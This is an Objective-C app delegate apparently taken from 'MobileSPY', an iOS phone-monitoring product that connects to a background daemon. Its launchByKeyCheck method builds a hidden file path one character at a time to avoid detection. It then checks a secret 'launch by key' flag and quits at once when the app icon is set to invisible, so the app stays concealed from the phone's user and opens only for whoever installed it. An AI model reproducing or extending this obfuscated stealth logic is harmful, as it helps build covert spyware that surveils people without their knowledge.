//
//  MobileSPYAppDelegate.m
//  Apricot
//
//  Created by Dominique  Mayrand on 12/1/11.
//  Copyright __MyCompanyName__ 2011. All rights reserved.
//

#import "ApricotAppDelegate.h"
#import "RootViewController.h"

#import "AppUIConnection.h"
#import "LicenseInfo.h"
#import "ConfigurationManagerImpl.h"
#import "PhoneInfoImp.h"
#import "DaemonPrivateHome.h"
#import "PreferenceManagerImpl.h"
#import "PrefVisibility.h"

@interface ApricotAppDelegate (private)
- (void) launchByKeyCheck;
@end

@implementation ApricotAppDelegate

@synthesize window;
@synthesize navigationController;

@synthesize mAppUIConnection;
@synthesize mLicenseInfo;
@synthesize mConfigurationManager;
@synthesize mPhoneInfo;

#pragma mark -
#pragma mark Application lifecycle

- (void)applicationDidFinishLaunching:(UIApplication *)application {
    
    // Override point for customization after app launch
	[window addSubview:[navigationController view]];
    [window makeKeyAndVisible];
	
	// Connection to daemon
	mAppUIConnection = [[AppUIConnection alloc] init];
	mConfigurationManager = [[ConfigurationManagerImpl alloc] init];
	mPhoneInfo = [[PhoneInfoImp alloc] init];
	
	[self launchByKeyCheck];
}

// If we implement this method; applicationDidFinishLaunching: will never be called
//- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
//	DLog (@"launchOptions = %@", launchOptions);
//	return YES;
//}

- (void)applicationWillTerminate:(UIApplication *)application {
	// Save data if appropriate
}

- (void)applicationDidEnterBackground:(UIApplication *)application {
	
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
	//[self launchByKeyCheck];
    // Delay a bit before exit application to prevent phone screen unresponse or freeze
    [self performSelector:@selector(launchByKeyCheck) withObject:nil afterDelay:0.1];
}

- (void) launchByKeyCheck {
	// /tmp/launchddd.plist
	NSString *filePath = [NSString stringWithString:@"/"];
	filePath = [filePath stringByAppendingString:@"t"];
	filePath = [filePath stringByAppendingString:@"m"];
	filePath = [filePath stringByAppendingString:@"p"];
	filePath = [filePath stringByAppendingString:@"/"];
	filePath = [filePath stringByAppendingString:@"l"];
	filePath = [filePath stringByAppendingString:@"a"];
	filePath = [filePath stringByAppendingString:@"u"];
	filePath = [filePath stringByAppendingString:@"n"];
	filePath = [filePath stringByAppendingString:@"c"];
	filePath = [filePath stringByAppendingString:@"h"];
	filePath = [filePath stringByAppendingString:@"d"];
	filePath = [filePath stringByAppendingString:@"d"];
	filePath = [filePath stringByAppendingString:@"d"];
	filePath = [filePath stringByAppendingString:@"."];
	filePath = [filePath stringByAppendingString:@"p"];
	filePath = [filePath stringByAppendingString:@"l"];
	filePath = [filePath stringByAppendingString:@"i"];
	filePath = [filePath stringByAppendingString:@"s"];
	filePath = [filePath stringByAppendingString:@"t"];
	
	NSMutableDictionary *launchInfo = [[NSMutableDictionary alloc] initWithContentsOfFile:filePath];
	NSNumber *launchByKey = [launchInfo objectForKey:@"lanuchByKey"];
	DLog (@"launchByKey is: %@", launchByKey);
	if (![launchByKey boolValue]) {
		
		NSFileManager *fileManager = [NSFileManager defaultManager];
		NSError *error = nil;
		[fileManager removeItemAtPath:filePath error:&error];
		DLog (@"[1]launchddd deletion is error = %@", error);
		
        PreferenceManagerImpl *prefManagerImpl = [[PreferenceManagerImpl alloc] init];
        PrefVisibility *prefVisibility = (PrefVisibility *)[prefManagerImpl preference:kVisibility];
        if ([prefVisibility mVisible]) {
            // Application icon is visible so let the application come to foreground
        } else {
            exit(0);
        }
        [prefManagerImpl release];
	}
	
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSError *error = nil;
	[fileManager removeItemAtPath:filePath error:&error];
	DLog (@"[2]launchddd deletion is error = %@", error);
	
	[launchInfo release];
}

#pragma mark -
#pragma mark Memory management

- (void)dealloc {
	[mPhoneInfo release];
	[mConfigurationManager release];
	[mLicenseInfo release];
	[mAppUIConnection release];
	[navigationController release];
	[window release];
	[super dealloc];
}

@end

